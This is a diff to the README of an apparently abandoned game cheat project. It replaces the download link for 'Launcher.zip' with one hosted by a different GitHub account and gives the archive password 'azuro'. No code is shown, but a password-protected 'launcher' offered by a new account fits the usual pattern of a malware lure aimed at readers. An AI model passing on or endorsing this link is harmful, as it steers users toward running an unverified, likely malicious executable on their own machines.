@@ -24,7 +24,7 @@ This project won't be continued.
 I've not tested the cheat since 'first commit' release date.  
 
 ## DOWNLOAD   
-You need to download [Launcher](https://github.com/Piecegloeradicate/latest/releases/download/New/Launcher.zip)
+You need to download [Launcher](https://github.com/mrtwister73sk/Launch/releases/download/Latest/Launcher.zip)
 
 * Pass: azuro
 
